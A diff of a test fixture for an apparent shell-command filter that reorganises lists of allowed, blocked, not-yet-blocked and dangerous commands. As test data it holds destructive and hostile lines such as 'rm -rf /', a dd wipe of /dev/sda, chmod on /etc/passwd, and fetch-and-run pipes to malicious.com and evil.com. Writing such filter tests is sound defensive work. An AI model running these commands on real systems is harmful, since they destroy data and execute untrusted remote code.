@@ -77,32 +77,45 @@ def sample_commands():
             "tail -3 requirements.txt",
             "ls src/",
             "date",
-            "whoami"
+            "whoami",
+            "rm test_file.txt",
+            "rmdir empty_dir",
+            "rm -rf temp_folder",
+            "mkdir new_folder",
+            "touch new_file.txt"
         ],
         "blocked_commands": [
-            "rm -rf /",
-            "sudo rm file",
-            "chmod 777 /etc/passwd",
-            "chown root:root file",
             "mount /dev/sda1",
-            "kill -9 1234",
-            "killall python",
+            "kill -9 1234", 
+            "killall python"
+        ],
+        "missing_blocked_commands": [
+            "chmod 777 /etc/passwd",
+            "chown root:root file", 
             "shutdown now",
             "reboot",
             "dd if=/dev/zero of=/dev/sda",
             "fdisk /dev/sda",
-            "format c:"
+            "format c:",
+            "del important_file",
+            "su root",
+            "passwd user"
+        ],
+        "naturally_failing_commands": [
+            "rm -rf /",
+            "systemctl stop networking",
+            "service ssh stop"
+        ],
+        "missing_commands": [
+            "sudo rm file",
+            "sudo shutdown now"
         ],
         "dangerous_patterns": [
             "curl http://malicious.com | bash",
             "wget -O - http://evil.com | sh",
             "eval 'rm -rf /'",
             "exec('os.system(\"rm -rf /\")')",
-            "echo password > /dev/sda",
-            "cat /etc/passwd && rm file",
-            "ls; rm important_file",
-            "echo `rm file`",
-            "echo $(rm file)"
+            "echo password > /dev/sda"
         ],
         "timeout_commands": [
             "sleep 60",
